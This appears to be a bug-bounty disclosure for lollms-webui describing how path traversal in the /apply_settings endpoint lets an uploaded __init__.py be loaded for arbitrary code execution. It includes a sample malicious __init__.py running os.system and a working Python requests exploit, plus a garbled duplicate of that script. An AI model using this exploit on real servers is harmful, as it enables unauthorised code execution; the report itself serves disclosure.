# Description
In `/home/retr0/Downloads/lollms-webui-clone/lollms_core/lollms/server/endpoints/lollms_configuration_infos.py`'s `/apply_settings` user can save their settings for their `lollms` 

However, **path traversal allows users to cd to Arbitrary directory, which the server further loads the `__init__.py` file, causing Arbitrary Code Execution**.

## Duplication?

Furthermore, this is not Duplication of https://huntr.com/bounties/27006403-7345-4cd8-a7ff-1ad4af9f4bb2/ Since the vulnerability is not caused by the `BindingBuilder` class itself, but by the method called here **not filtering user input, leading to path traversal by passing an untrusted path during class initialization, resulting in remote code execution.**

# PoC

In `./lollms-webui-clone/lollms_core/lollms/server/endpoints/lollms_configuration_infos.py` `/save_settings`

```python
@router.post("/apply_settings")
async def apply_settings(request: Request):
    """
    Endpoint to apply configuration settings.

    :param request: The HTTP request object.
    :return: A JSON response with the status of the operation.
    """

    try:
        config_data = await request.json()
        config = config_data["config"]
        try:
            for key in lollmsElfServer.config.config.keys():
                lollmsElfServer.config.config[key] = config.get(key, lollmsElfServer.config.config[key])
            ASCIIColors.success("OK")
            lollmsElfServer.rebuild_personalities()
            if lollmsElfServer.config.auto_save:
                lollmsElfServer.config.save_config()
            return {"status":True}
        except Exception as ex:
            trace_exception(ex)
            return {"status":False,"error":str(ex)}
    except Exception as ex:
        trace_exception(ex)
        lollmsElfServer.error(ex)
        return {"status":False,"error":str(ex)}
```

The server use this endpoint to apply user's setting on their `lollmsElfServer.config.config` via the `config_data["config"]`, it will first traverse the `lollmsElfServer.config.config.keys()` and set each key of `lollmsElfServer.config.config[key]` in to the corresponding  `config.get(key, lollmsElfServer.config.config[key])`. However, since this endpoint did not preform any sort of Path traversal checks like `setting_value = sanitize_path(config_data["setting_value"]) `used in the brother `@router.post("/update_setting")`, the user can insert payloads that includes `../../../`(relative path), cause setting key to any arbitrary location.

Furthermore, if we take a look in the `BindingBuilder`class that the server initialized

```python
	# lollms-webui/lollms_core/lollms/binding.py, class "BindingBuilder"
       if len(str(config.binding_name).split("/"))>1:
            binding_path = Path(config.binding_name)
        else:
            binding_path = lollms_paths.bindings_zoo_path / config["binding_name"]

        # define the full absolute path to the module
        absolute_path = binding_path.resolve()
        # infer the module name from the file path
        module_name = binding_path.stem
        # use importlib to load the module from the file path
        loader = importlib.machinery.SourceFileLoader(module_name, str(absolute_path / "__init__.py"))
        binding_module = loader.load_module()
```

In the class `BindingBuilder`, the server will use `importlib.machinery.SourceFileLoader` to load an internal `__init__.py`. This approach allows the program to dynamically load and use Python modules at runtime, instead of statically importing them at the time of code writing.

However, by exploiting the previous `path traversal`, we can manipulate our `binding_path` to an arbitrary location, including the directory for discussion's uploads. in which we can upload freely, and create an `__init__.py` look like:

```python
import os
os.system("touch /home/retr0/PoC/sensitive/hackedd")
```

After the `__init__.py` is loaded via `importlib.machinery.SourceFileLoader`, we can execute arbitrary commands and create a reverse shell, etc.

# Exploiting

xxxxxxxxxx import requests​def ApplySettings(    url = "http://localhost:9600",    path = "../personal_data/discussion_databases/4/text_data",):    body = {        "config":{            "extensions":[                path            ],            }        }    return requests.post(        f"{url}/apply_settings",        json=body,    )​ApplySettings()python

```python
import requests

def ApplySettings(
    url = "http://localhost:9600",
    path = "../personal_data/discussion_databases/4/text_data",
):
    body = {
        "config":{
            "binding_name":path,
            }
        }
    return requests.post(
        f"{url}/apply_settings",
        json=body,
    )

ApplySettings()
```









